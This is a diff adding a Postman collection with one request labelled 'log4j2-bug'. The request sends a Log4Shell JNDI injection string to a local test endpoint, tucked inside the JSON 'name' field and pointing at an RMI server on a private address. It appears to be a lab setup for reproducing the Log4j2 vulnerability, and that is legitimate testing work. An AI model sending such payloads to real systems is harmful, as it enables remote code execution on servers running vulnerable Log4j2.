@@ -1,0 +1,29 @@
+{
+	"info": {
+		"_postman_id": "83b08573-617b-42e0-a4e7-20afb266b100",
+		"name": "bug",
+		"schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "log4j2-bug",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"name\":\"${jndi:rmi://192.168.1.103:1099/test}\",\n\t\"age\":18\n}"
+				},
+				"url": "http://localhost:8080/test/bug"
+			},
+			"response": []
+		}
+	]
+}
